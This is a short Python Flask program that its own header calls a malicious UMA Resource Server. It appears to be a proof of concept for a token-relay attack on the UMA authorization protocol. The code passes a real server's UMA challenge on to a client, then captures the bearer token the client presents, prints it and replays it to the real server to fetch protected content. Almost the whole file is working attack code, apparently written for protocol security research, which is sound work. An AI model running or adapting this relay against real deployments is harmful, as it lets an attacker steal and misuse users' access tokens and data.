# A simple malicious UMA Resource Server

from werkzeug.datastructures import WWWAuthenticate
from flask import Flask, request, Response
import requests
from flask import Response
import os

from common import parse_bearer

INDEX = int(os.environ.get("INDEX", 1))

app = Flask(__name__)


TARGET_RS = "http://localhost:8081"


@app.route("/")
def home():
    authz = request.headers.get("Authorization")
    if authz is not None:
        token = parse_bearer(authz)
        if token is not None:
            print(f"Token from real RS: {token}")
            response = requests.get(TARGET_RS + "/", headers={"Authorization": authz})
            if response.status_code != 401:
                print("Response received from RS: " + repr(response.content))
                return "OK", 200

    # Make request and foward "WWW-Authenticate: UMA ...":

    response = requests.get(TARGET_RS + "/")
    if response.status_code == 200:
        return "OK"
    if response.status_code != 401:
        return "?", 400
    auth_req = response.headers.get("WWW-Authenticate")
    print(f"WWW-Authenticate from real RS: {auth_req}")
    parsed_auth_req = WWWAuthenticate.from_header(auth_req)
    if parsed_auth_req.type.lower() != "uma":
        return "?", 400
    res = Response(status=401)
    res.headers.set("WWW-Authenticate", auth_req)
    return res
